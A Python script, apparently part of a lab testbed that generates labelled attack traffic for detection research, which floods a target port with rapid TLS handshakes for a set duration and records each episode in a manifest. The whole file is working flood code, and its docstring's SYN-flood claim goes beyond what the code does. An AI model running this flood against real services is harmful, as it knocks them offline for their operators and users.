#!/usr/bin/env python3
"""
traffic/attacks/a1_flood.py — A1: Volumetric TLS-handshake & SYN flood.

Rapidly attempts TLS handshakes against the target port (e.g. 8883/443).
Handles SYN flooding via socket backlog exhaustion.
"""
import ssl
import socket
import time
import argparse
import os
import sys

REPO_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", ".."))
sys.path.insert(0, REPO_DIR)
from traffic.manifest import ManifestWriter


def run_a1_flood(target_ip="10.0.2.10", target_port=8883, duration_s=10.0,
                 manifest_path="results/manifest.csv", run_id="run_exp"):
    print(f"[A1 FLOOD] Launching volumetric TLS handshake flood against {target_ip}:{target_port} for {duration_s}s")
    writer = ManifestWriter(manifest_path, run_id=run_id)
    start_ts = time.time()
    count = 0

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    while time.time() - start_ts < duration_s:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            tls = ctx.wrap_socket(s, server_hostname=target_ip)
            tls.connect((target_ip, target_port))
            tls.sendall(b"FLOOD_HANDSHAKE\n")
            tls.close()
            count += 1
        except Exception:
            count += 1
            pass

    end_ts = time.time()
    writer.record_episode(
        family="A1_flood",
        src_ip="10.0.1.4",
        dst_ip=target_ip,
        dst_port=target_port,
        start_ts=start_ts,
        end_ts=end_ts,
        params={"attempts": count, "duration_s": duration_s},
    )
    print(f"[A1 FLOOD] Completed {count} connection attempts in {duration_s:.1f}s")


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", default="10.0.2.10")
    parser.add_argument("--port", type=int, default=8883)
    parser.add_argument("--duration", type=float, default=10.0)
    parser.add_argument("--manifest", default="results/manifest.csv")
    parser.add_argument("--run-id", default="run_a1")
    args = parser.parse_args()

    run_a1_flood(args.target, args.port, args.duration, args.manifest, args.run_id)
